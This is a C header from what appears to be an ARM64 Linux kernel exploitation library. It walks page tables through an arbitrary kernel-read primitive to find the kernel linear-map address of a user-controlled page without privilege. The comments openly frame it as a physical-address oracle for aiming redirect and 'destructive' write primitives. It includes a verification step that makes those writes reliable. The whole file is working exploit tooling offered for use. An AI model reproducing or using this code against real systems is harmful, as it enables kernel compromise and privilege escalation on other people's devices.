/* lib/addr/pgwalk.h -- resolve a userspace virtual address to its linear-map
 * kernel address using an arbitrary kernel read alone: no /proc/<pid>/pagemap,
 * no privilege.
 *
 * Given a target mm's top-level page-table base and a userspace VA mapped in it,
 * this walks the hardware page tables one descriptor at a time through a
 * caller-supplied read, and returns the linear-map VA of the 4KB page that VA
 * resolves to. Because the linear map is a fixed offset from physical memory
 * (physmap.h), that page then has a known kernel address a redirect primitive
 * can be pointed at -- without ever asking the kernel for a PFN. This turns a
 * plain arbitrary read into an exact physical-address oracle for any page the
 * caller controls in the target address space.
 *
 * ARM64, 4KB translation granule. The number of levels follows VA_BITS: three
 * for 39-bit user VAs, four for 48-bit. Each table descriptor carries the next
 * table's PHYSICAL address in bits [47:12]; page tables live in the linear map,
 * so pfn_to_va makes each one readable through the same primitive. A not-present
 * entry returns 0; a block (huge) mapping resolves to the 4KB page within it.
 */
#ifndef LIB_PGWALK_H
#define LIB_PGWALK_H

#include "physmap.h"   /* lib_pfn_to_va, PAGE_OFFSET/PHYS_OFFSET */

/* Arbitrary-read callback: return the 8 bytes at kernel linear-map VA `kva`.
 * `ctx` is passed through untouched, for the read primitive's own state. */
typedef unsigned long long (*lib_pgwalk_read)(unsigned long long kva, void *ctx);

#define LIB_PGWALK_DESC_VALID 0x1ULL                   /* bit 0: entry present     */
#define LIB_PGWALK_DESC_TABLE 0x2ULL                   /* bit 1: 1=table, 0=block  */
#define LIB_PGWALK_ADDR_MASK  0x0000FFFFFFFFF000ULL    /* output address bits 47:12 */

/* Walk `uva` in the address space whose top-level table is at linear-map VA
 * `pgd_va`, reading each descriptor through `rd`. `va_bits` selects the level
 * count (>=48 -> 4 levels, else 3). Returns the containing 4KB page's linear-map
 * VA, or 0 if any level is not present or the base/callback is missing. */
static inline unsigned long long lib_pgwalk_4k(lib_pgwalk_read rd, void *ctx,
					       unsigned long long pgd_va,
					       unsigned long long uva,
					       int va_bits)
{
	if (!rd || !pgd_va)
		return 0;
	int shift[4];
	int levels = 0;
	if (va_bits >= 48)
		shift[levels++] = 39;    /* level 0 index bits (48-bit VA only) */
	shift[levels++] = 30;            /* PGD/PUD */
	shift[levels++] = 21;            /* PMD     */
	shift[levels++] = 12;            /* PTE     */

	unsigned long long tbl = pgd_va;
	for (int i = 0; i < levels; i++) {
		unsigned long idx = (unsigned long)((uva >> shift[i]) & 0x1ffULL);
		unsigned long long d = rd(tbl + (unsigned long long)idx * 8, ctx);
		if (!(d & LIB_PGWALK_DESC_VALID))
			return 0;
		unsigned long long oa = d & LIB_PGWALK_ADDR_MASK;
		if (i == levels - 1)
			return lib_pfn_to_va(oa >> 12);            /* last level: the page */
		if (!(d & LIB_PGWALK_DESC_TABLE)) {                /* block mapping here */
			unsigned long long span = 1ULL << shift[i];
			unsigned long long pa = (oa & ~(span - 1)) + (uva & (span - 1));
			return lib_pfn_to_va((pa & ~0xfffULL) >> 12);
		}
		tbl = lib_pfn_to_va(oa >> 12);                     /* descend */
	}
	return 0;
}

/* Resolve `uva` (lib_pgwalk_4k) AND confirm the page is the one the caller means:
 * read its first 8 bytes back through the same primitive and compare to `magic`.
 * Returns the page's linear-map VA only when the walk succeeds AND the magic is
 * present; 0 otherwise. This turns the walk into a VERIFIED resolve: a caller
 * that has written `magic` into the target userspace page can confirm, before it
 * fires any destructive primitive at page_va, that page_va really aliases that
 * page -- so a wrong resolve becomes a clean miss instead of a corrupt write.
 * `rd8` reads 8 bytes at a linear-map VA (same shape as the walk callback). */
static inline unsigned long long lib_pgwalk_verify(lib_pgwalk_read rd, void *ctx,
						   unsigned long long pgd_va,
						   unsigned long long uva, int va_bits,
						   unsigned long long magic)
{
	unsigned long long page_va = lib_pgwalk_4k(rd, ctx, pgd_va, uva, va_bits);
	if (!page_va)
		return 0;
	return rd(page_va, ctx) == magic ? page_va : 0;
}

#endif /* LIB_PGWALK_H */
